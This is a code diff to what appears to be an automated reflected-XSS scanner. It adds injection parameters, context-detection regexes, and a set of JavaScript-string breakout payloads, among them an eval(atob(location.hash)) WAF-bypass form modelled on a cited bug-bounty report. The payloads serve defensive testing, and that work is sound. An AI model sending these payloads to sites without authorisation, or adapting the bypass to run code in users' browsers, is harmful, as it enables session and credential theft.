@@ -514,9 +514,20 @@ _XSS_INJECTION_POINTS: list[tuple[str, str]] = [
     ("query_url", "?url={canary}"),
     ("query_callback", "?callback={canary}"),
     ("query_next", "?next={canary}"),
+    # Tile/asset-server style params (BUGB-3057 pattern: ipm-maptiles/?style=..&key=..)
+    ("query_style", "?style={canary}"),
+    ("query_key", "?key={canary}"),
+    ("query_id", "?id={canary}"),
+    ("query_page", "?page={canary}"),
+    ("query_view", "?view={canary}"),
+    ("query_theme", "?theme={canary}"),
+    ("query_lang", "?lang={canary}"),
+    ("query_locale", "?locale={canary}"),
     ("path_segment", "/{canary}"),
 ]
 
+# HTML-context payloads: trigger when input lands inside the document body
+# outside any quoted attribute / JS string.
 _XSS_PAYLOADS: list[tuple[str, str]] = [
     ("basic_script", '<script>alert("XSS")</script>'),
     ("img_onerror", '<img src=x onerror=alert(1)>'),
@@ -528,6 +539,76 @@ _XSS_PAYLOADS: list[tuple[str, str]] = [
     ("template_literal", '${alert(1)}'),
     ("js_uri", 'javascript:alert(1)'),
 ]
+
+# JavaScript-string-context payloads: trigger when input lands inside an
+# onclick=/onload=/<script> JS string literal. These break out of the
+# string and inject code without using <, >, =, /, or = — bypassing the
+# common "block angle brackets" WAF rule. Pattern from BUGB-3057
+# (Avast ipm-maptiles /?style=...).
+#
+# Each tuple is (label, payload). The payload uses {C} as a placeholder
+# for the canary token so we can detect "canary appeared as raw JS"
+# (i.e. the string '-canary-' actually executed) versus "canary appeared
+# encoded" (i.e. the app safely escaped it as &#39;).
+_XSS_JS_CONTEXT_PAYLOADS: list[tuple[str, str]] = [
+    # Single-quote breakout — exact BUGB-3057 shape.
+    ("js_str_squote_break", "x')-{C}-('"),
+    # Double-quote breakout — same pattern with " instead of '.
+    ('js_str_dquote_break', 'x")-{C}-("'),
+    # Backtick (template-literal) breakout — modern JS frameworks.
+    ('js_str_backtick_break', "x`-{C}-`"),
+    # Statement-terminator inside a JS string — drops out, runs canary
+    # as a free identifier, and comments out the rest of the line.
+    ('js_str_squote_terminator', "';{C};//"),
+    ('js_str_dquote_terminator', '";{C};//'),
+    # WAF bypass via location.hash — same shape as BUGB-3057's eval(atob())
+    # exploit, but with canary as the identifier so we can detect
+    # successful injection without actually executing arbitrary code.
+    ('js_str_hash_eval_bypass', "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
+]
+
+
+# Regex patterns we use to decide *where* a canary landed in the response.
+# We treat any of these contexts as "JS execution context":
+#   1. inside <script>...canary...</script>
+#   2. inside an event handler attribute  onclick="...canary..." (single or
+#      double quoted; with or without leading/trailing whitespace)
+#   3. inside an inline javascript: URI  href="javascript:...canary..."
+_JS_CONTEXT_REGEXES = [
+    # <script ...>...CANARY...</script>
+    (r"<script\b[^>]*>[^<]*{C}[^<]*</script>", "script_block"),
+    # onclick="...CANARY..."  (double-quoted attribute, may contain single quotes)
+    (r"\bon[a-z]+\s*=\s*\"[^\"]*{C}[^\"]*\"", "event_handler_attr"),
+    # onclick='...CANARY...'  (single-quoted attribute, may contain double quotes)
+    (r"\bon[a-z]+\s*=\s*'[^']*{C}[^']*'", "event_handler_attr"),
+    # href="javascript:...CANARY..." (double-quoted)
+    (r"\bhref\s*=\s*\"\s*javascript:[^\"]*{C}[^\"]*\"", "javascript_uri"),
+    # href='javascript:...CANARY...' (single-quoted)
+    (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
+]
+
+
+def _classify_canary_context(body: str, canary: str) -> str | None:
+    """Return one of {'script_block','event_handler_attr','javascript_uri',
+    'html_body'} if the canary is reflected in that context, else None.
+
+    Match priority is JS-context first (most dangerous), then plain HTML
+    body. We don't fire on attribute-quoted reflections that aren't event
+    handlers — those are usually safe (e.g. value="..."`).
+    """
+    if canary not in body:
+        return None
+    import re as _re
+    for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
+        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
+        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
+            return ctx_name
+    # Canary present but not in a JS sink. Check it's at least in the
+    # rendered HTML body (not just inside a quoted attribute we don't
+    # care about). The simplest check: canary appears outside any tag.
+    if _re.search(r">[^<]*" + _re.escape(canary) + r"[^<]*<", body):
+        return "html_body"
+    return None
 
 
 async def run_reflected_xss_probe(
@@ -559,7 +640,10 @@ async def run_reflected_xss_probe(
             break
         base_url = f"https://{host}"
 
-        reflection_points: list[tuple[str, str]] = []
+        # Per-host: build a list of (param_label, tpl, ctx) where the
+        # canary landed. ctx tells us which payload class to escalate
+        # with (HTML body vs JS string).
+        reflection_points: list[tuple[str, str, str]] = []
         for label, tpl in _XSS_INJECTION_POINTS:
             if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                 break
@@ -568,11 +652,12 @@ async def run_reflected_xss_probe(
                 resp = await http_client.get(
                     test_url, timeout=10.0, follow_redirects=True, headers=_PROBE_HEADERS,
                 )
-                if canary in resp.text:
-                    reflection_points.append((label, tpl))
+                ctx = _classify_canary_context(resp.text[:200_000], canary)
+                if ctx:
+                    reflection_points.append((label, tpl, ctx))
                     _progress("active_baseline_step", {
                         "host": host, "step": "xss_reflection_found",
-                        "point": label,
+                        "point": label, "context": ctx,
                     })
             except Exception:
                 continue
@@ -580,8 +665,19 @@ async def run_reflected_xss_probe(
         if not reflection_points:
             continue
 
-        for point_label, point_tpl in reflection_points[:3]:
-            for payload_label, payload in _XSS_PAYLOADS:
+        # Cap escalation work: 5 reflection points x payloads, first hit
+        # per (point, context) is enough.
+        for point_label, point_tpl, ctx in reflection_points[:5]:
+            payloads_to_try: list[tuple[str, str]]
+            if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
+                payloads_to_try = [
+                    (lbl, tpl.replace("{C}", "alert(1)"))
+                    for lbl, tpl in _XSS_JS_CONTEXT_PAYLOADS
+                ]
+            else:
+                payloads_to_try = list(_XSS_PAYLOADS)
+
+            for payload_label, payload in payloads_to_try:
                 if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                     break
                 test_url = f"{base_url}{point_tpl.format(canary=payload)}"
@@ -590,36 +686,58 @@ async def run_reflected_xss_probe(
                         test_url, timeout=10.0, follow_redirects=True,
                         headers=_PROBE_HEADERS,
                     )
-                    body = resp.text[:100_000]
+                    body = resp.text[:200_000]
                 except Exception:
                     continue
 
                 if payload not in body:
                     continue
 
+                # JS-context findings are always Critical (direct code
+                # execution); HTML-body findings are High.
+                if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
+                    sev = "Critical"
+                    title = f"Reflected XSS via JavaScript Context Breakout ({point_label}, {ctx})"
+                    evidence = (
+                        f"User input from parameter '{point_label}' is reflected "
+                        f"unencoded inside a {ctx.replace('_', ' ')} on {host}. "
+                        f"Payload '{payload_label}' (which contains no <, >, =, /, or "
+                        f"comma — bypassing common WAF rules) successfully broke out "
+                        f"of the JS string context: {payload}. "
+                        f"Pattern matches BUGB-3057 (WAF-bypass JS-context reflection)."
+                    )
+                else:
+                    sev = "High"
+                    title = f"Reflected XSS via {point_label}"
+                    evidence = (
+                        f"Payload '{payload_label}' reflected unencoded in response "
+                        f"body at {test_url}. The payload [{payload}] appears "
+                        f"verbatim in the HTML response, confirming reflected XSS."
+                    )
+
                 f = {
-                    "title": f"Reflected XSS via {point_label}",
-                    "severity": "High",
+                    "title": title,
+                    "severity": sev,
                     "confidence": "High",
                     "owasp_category": "A03:2021",
                     "cwe": "CWE-79",
                     "url": test_url,
                     "parameter": point_label,
                     "payload": payload,
-                    "evidence": (
-                        f"Payload '{payload_label}' reflected unencoded in response body "
-                        f"at {test_url}. The payload [{payload}] appears verbatim in "
-                        f"the HTML response, confirming reflected XSS."
-                    ),
+                    "evidence": evidence,
                     "remediation": (
-                        "HTML-encode all user input before reflecting it in the page. "
-                        "Implement a Content-Security-Policy header to mitigate "
-                        "exploitation even if encoding is missed."
+                        "Context-aware escape user input before reflecting it. "
+                        "For JS string contexts, JSON-encode and HTML-escape; "
+                        "for HTML body, HTML-escape; for attribute values, "
+                        "use attribute encoding. Implement a Content-Security-"
+                        "Policy header to mitigate exploitation even if encoding "
+                        "is missed."
                     ),
                     "phase": "Active Baseline (Reflected XSS)",
                     "tool": "active_baseline.reflected_xss_probe",
                     "_finding_source": "active_baseline",
                     "_payload_label": payload_label,
+                    "_xss_context": ctx,
                 }
                 findings.append(f)
                 _emit(f)
